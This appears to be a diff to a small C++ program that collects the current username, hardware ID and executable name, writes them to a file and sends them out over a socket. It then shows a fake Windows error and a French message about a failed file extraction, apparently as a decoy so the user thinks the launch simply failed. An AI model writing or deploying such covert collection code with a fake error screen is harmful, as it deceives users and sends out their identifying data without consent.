@@ -102,28 +102,31 @@ int socket_connection_handle(std::string send_infos)
     return (0);
 }
 
-int program(void)
+int program(std::string path_or_name)
 {
     std::string time_in_str;
+    std::string exec_name;
     std::string username;
-    std::string HWID;
     std::string full_str;
+    std::string HWID;
 
+    exec_name = get_program_name(path_or_name);
     username = get_current_username();
     HWID = get_hardware_ID();
-    full_str = username + " " + HWID;
+    full_str = username + " " + exec_name + " " + HWID;
     write_to_file(full_str, username);
     if (socket_connection_handle(full_str) == 1)
         return (error_return("PROBLEM WITH THE CONNECTION", 1));
     return (0);
 }
 
-int main(void)
+
+int main(int, char *argv[])
 {
     #if defined(_WIN32) || defined(_WIN64)
         SetConsoleOutputCP(65001);
     #endif
-    if (program())
+    if (program(argv[0]))
         return (1);
     std::cerr << "Error: 0x80004005" << std::endl
             << "Un problème à été détecté lors de l'extraction du fichier" << std::endl
